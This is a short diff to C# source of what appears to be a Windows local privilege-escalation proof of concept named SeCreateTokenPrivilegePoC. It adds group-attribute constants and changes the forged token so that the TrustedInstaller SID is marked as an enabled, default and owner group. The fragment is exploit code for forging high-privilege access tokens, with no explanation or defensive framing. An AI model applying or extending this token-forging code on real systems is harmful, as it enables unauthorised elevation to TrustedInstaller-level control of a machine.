@@ -424,6 +424,8 @@ namespace SeCreateTokenPrivilegePoC
         const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
         const uint SE_PRIVILEGE_ENABLED = 0x00000002;
         const uint SE_GROUP_ENABLED = 0x00000004;
+        const uint SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002;
+        const uint SE_GROUP_OWNER = 0x00000008;
         const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
         static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
@@ -567,7 +569,9 @@ namespace SeCreateTokenPrivilegePoC
                 else if (sid == SECURITY_WORLD_RID)
                 {
                     sidAndAttributes.Sid = pTrustedInstaller;
-                    sidAndAttributes.Attributes = SE_GROUP_ENABLED;
+                    sidAndAttributes.Attributes = SE_GROUP_ENABLED |
+                        SE_GROUP_ENABLED_BY_DEFAULT |
+                        SE_GROUP_OWNER;
                 }
                 else
                 {
